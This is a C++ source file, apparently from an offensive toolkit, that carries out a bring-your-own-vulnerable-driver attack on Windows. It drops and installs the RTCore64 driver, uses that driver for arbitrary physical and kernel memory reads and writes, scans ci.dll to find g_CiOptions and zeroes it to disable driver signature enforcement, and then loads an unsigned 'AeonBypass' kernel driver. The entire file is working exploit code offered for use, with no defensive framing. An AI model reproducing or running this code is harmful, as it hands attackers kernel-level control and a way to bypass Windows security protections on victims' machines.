// ==================== byovd.cpp ====================
// BYOVD physical-memory mapper + DSE bypass + embedded driver drop
// Compile: cl.exe /c /O2 /GS- /guard:cf- byovd.cpp
// Links into core.dll. Requires advapi32.lib.

#include <windows.h>
#include <winioctl.h>
#include <cstdint>
#include <cstdio>
#include <cstring>

#pragma comment(lib, "advapi32.lib")

#define RTCORE64_DEVICE_NAME  "\\\\.\\RTCore64"
#define RTCORE64_MREAD_PHYS     0x80002050
#define RTCORE64_MWRITE_PHYS    0x80002058
#define RTCORE64_MREAD_CR3      0x80002060

#define DRIVER_XOR_KEY 0x5A

// Embedded RTCore64.sys — XOR-encrypted placeholder.
// Operator replaces this array with actual driver bytes via build script.
static const uint8_t g_rtcore64Data[] = {
    0xCB, 0xCA, 0xC9, 0xC8, 0xC7, 0xC6, 0xC5, 0xC4,
    // Truncated — real build embeds full driver via resource script or post-build tool
};
static const size_t g_rtcore64Size = sizeof(g_rtcore64Data);

struct PhysReadReq { uint64_t phys; uint32_t size; };
struct PhysWriteReq { uint64_t phys; uint32_t size; uint8_t data[1]; };

struct SYSTEM_MODULE {
    ULONG64 Reserved[2];
    PVOID Base;
    ULONG Size;
    ULONG Flags;
    USHORT Index;
    USHORT NameLen;
    USHORT NameOffset;
    CHAR Name[256];
};

struct SYSTEM_MODULE_INFO {
    ULONG Count;
    SYSTEM_MODULE Modules[1];
};

static HANDLE g_hRTCore = INVALID_HANDLE_VALUE;

static bool dropDriver(const char* path) {
    uint8_t* dec = (uint8_t*)VirtualAlloc(NULL, g_rtcore64Size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!dec) return false;
    for (size_t i = 0; i < g_rtcore64Size; i++) dec[i] = g_rtcore64Data[i] ^ DRIVER_XOR_KEY;
    HANDLE hFile = CreateFileA(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) { VirtualFree(dec, 0, MEM_RELEASE); return false; }
    DWORD wr = 0;
    WriteFile(hFile, dec, (DWORD)g_rtcore64Size, &wr, NULL);
    CloseHandle(hFile);
    VirtualFree(dec, 0, MEM_RELEASE);
    return wr == g_rtcore64Size;
}

static bool initRTCore() {
    g_hRTCore = CreateFileA(RTCORE64_DEVICE_NAME, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (g_hRTCore == INVALID_HANDLE_VALUE) {
        if (!dropDriver("C:\\RTCore64.sys")) return false;
        SC_HANDLE sc = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
        if (!sc) return false;
        SC_HANDLE svc = CreateServiceA(sc, "RTCore64", "RTCore64", SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER,
            SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL, "C:\\RTCore64.sys", NULL, NULL, NULL, NULL, NULL);
        if (!svc) svc = OpenServiceA(sc, "RTCore64", SERVICE_ALL_ACCESS);
        if (svc) { StartServiceA(svc, 0, NULL); CloseServiceHandle(svc); }
        CloseServiceHandle(sc);
        g_hRTCore = CreateFileA(RTCORE64_DEVICE_NAME, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    }
    return g_hRTCore != INVALID_HANDLE_VALUE;
}

static bool readPhys(uint64_t phys, void* buf, uint32_t size) {
    if (g_hRTCore == INVALID_HANDLE_VALUE) return false;
    DWORD out;
    PhysReadReq req = {phys, size};
    return DeviceIoControl(g_hRTCore, RTCORE64_MREAD_PHYS, &req, sizeof(req), buf, size, &out, NULL);
}

static bool writePhys(uint64_t phys, void* buf, uint32_t size) {
    if (g_hRTCore == INVALID_HANDLE_VALUE) return false;
    DWORD out;
    uint32_t reqSize = sizeof(PhysWriteReq) + size - 1;
    PhysWriteReq* req = (PhysWriteReq*)VirtualAlloc(NULL, reqSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!req) return false;
    req->phys = phys; req->size = size;
    memcpy(req->data, buf, size);
    BOOL ok = DeviceIoControl(g_hRTCore, RTCORE64_MWRITE_PHYS, req, reqSize, NULL, 0, &out, NULL);
    VirtualFree(req, 0, MEM_RELEASE);
    return ok;
}

static uint64_t getCR3() {
    if (g_hRTCore == INVALID_HANDLE_VALUE) return 0;
    DWORD out;
    uint64_t cr3 = 0;
    DeviceIoControl(g_hRTCore, RTCORE64_MREAD_CR3, NULL, 0, &cr3, sizeof(cr3), &out, NULL);
    return cr3;
}

static uint64_t virtToPhys(uint64_t cr3, uint64_t virt) {
    uint64_t pml4i = (virt >> 39) & 0x1FF;
    uint64_t pdpti = (virt >> 30) & 0x1FF;
    uint64_t pdi = (virt >> 21) & 0x1FF;
    uint64_t pti = (virt >> 12) & 0x1FF;
    uint64_t offset = virt & 0xFFF;

    uint64_t pml4e = 0;
    if (!readPhys(cr3 + pml4i * 8, &pml4e, 8)) return 0;
    if (!(pml4e & 1)) return 0;

    uint64_t pdpte = 0;
    if (!readPhys((pml4e & 0xFFFFFFFFFF000) + pdpti * 8, &pdpte, 8)) return 0;
    if (!(pdpte & 1)) return 0;
    if (pdpte & 0x80) return (pdpte & 0xFFFFFC0000000) + (virt & 0x3FFFFFFF);

    uint64_t pde = 0;
    if (!readPhys((pdpte & 0xFFFFFFFFFF000) + pdi * 8, &pde, 8)) return 0;
    if (!(pde & 1)) return 0;
    if (pde & 0x80) return (pde & 0xFFFFFFFFFE00000) + (virt & 0x1FFFFF);

    uint64_t pte = 0;
    if (!readPhys((pde & 0xFFFFFFFFFF000) + pti * 8, &pte, 8)) return 0;
    if (!(pte & 1)) return 0;
    return (pte & 0xFFFFFFFFFF000) + offset;
}

static bool readKernel(uint64_t cr3, uint64_t addr, void* buf, uint32_t size) {
    for (uint32_t i = 0; i < size; ) {
        uint64_t phys = virtToPhys(cr3, addr + i);
        if (!phys) return false;
        uint32_t chunk = 0x1000 - ((addr + i) & 0xFFF);
        if (chunk > size - i) chunk = size - i;
        if (!readPhys(phys, (uint8_t*)buf + i, chunk)) return false;
        i += chunk;
    }
    return true;
}

static bool writeKernel(uint64_t cr3, uint64_t addr, void* buf, uint32_t size) {
    for (uint32_t i = 0; i < size; ) {
        uint64_t phys = virtToPhys(cr3, addr + i);
        if (!phys) return false;
        uint32_t chunk = 0x1000 - ((addr + i) & 0xFFF);
        if (chunk > size - i) chunk = size - i;
        if (!writePhys(phys, (uint8_t*)buf + i, chunk)) return false;
        i += chunk;
    }
    return true;
}

static uint64_t getKernelModuleBase(const char* name, uint64_t* outSize) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    auto NtQuerySystemInformation = (NTSTATUS(NTAPI*)(ULONG, PVOID, ULONG, PULONG))GetProcAddress(ntdll, "NtQuerySystemInformation");
    if (!NtQuerySystemInformation) return 0;
    ULONG len = 0;
    NtQuerySystemInformation(0xB, NULL, 0, &len);
    auto info = (SYSTEM_MODULE_INFO*)VirtualAlloc(NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!info) return 0;
    NTSTATUS st = NtQuerySystemInformation(0xB, info, len, &len);
    uint64_t base = 0;
    if (NT_SUCCESS(st)) {
        for (ULONG i = 0; i < info->Count; i++) {
            char* modName = info->Modules[i].Name + info->Modules[i].NameOffset;
            if (_stricmp(modName, name) == 0) {
                base = (uint64_t)info->Modules[i].Base;
                if (outSize) *outSize = info->Modules[i].Size;
                break;
            }
        }
    }
    VirtualFree(info, 0, MEM_RELEASE);
    return base;
}

static uint64_t patternScanKernel(uint64_t cr3, uint64_t base, uint32_t size, const uint8_t* pat, const char* mask) {
    uint32_t patLen = (uint32_t)strlen(mask);
    auto buf = new uint8_t[size];
    if (!readKernel(cr3, base, buf, size)) { delete[] buf; return 0; }
    for (uint32_t i = 0; i < size - patLen; i++) {
        bool match = true;
        for (uint32_t j = 0; j < patLen; j++) {
            if (mask[j] == 'x' && buf[i+j] != pat[j]) { match = false; break; }
        }
        if (match) { delete[] buf; return base + i; }
    }
    delete[] buf;
    return 0;
}

static bool patchDSE() {
    if (!initRTCore()) return false;
    uint64_t cr3 = getCR3();
    if (!cr3) return false;

    uint64_t ciSize = 0;
    uint64_t ciBase = getKernelModuleBase("ci.dll", &ciSize);
    if (!ciBase) return false;

    uint8_t pat[] = {0x89, 0x0D, 0x00, 0x00, 0x00, 0x00};
    uint64_t ref = patternScanKernel(cr3, ciBase, ciSize, pat, "xx????");
    if (!ref) {
        uint8_t pat2[] = {0x8B, 0x05, 0x00, 0x00, 0x00, 0x00};
        ref = patternScanKernel(cr3, ciBase, ciSize, pat2, "xx????");
    }
    if (!ref) return false;

    int32_t rel = 0;
    readKernel(cr3, ref + 2, &rel, 4);
    uint64_t g_CiOptions = ref + 6 + rel;

    DWORD old = 0;
    return writeKernel(cr3, g_CiOptions, &old, sizeof(old));
}

extern "C" bool loadAeonDriver() {
    if (!patchDSE()) return false;
    SC_HANDLE sc = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!sc) return false;
    SC_HANDLE svc = CreateServiceA(sc, "AeonBypass", "AeonBypass", SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER,
        SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL, "C:\\AeonBypass.sys", NULL, NULL, NULL, NULL, NULL);
    if (!svc) svc = OpenServiceA(sc, "AeonBypass", SERVICE_ALL_ACCESS);
    bool ok = false;
    if (svc) {
        StartServiceA(svc, 0, NULL);
        CloseServiceHandle(svc);
        ok = true;
    }
    CloseServiceHandle(sc);
    return ok;
}
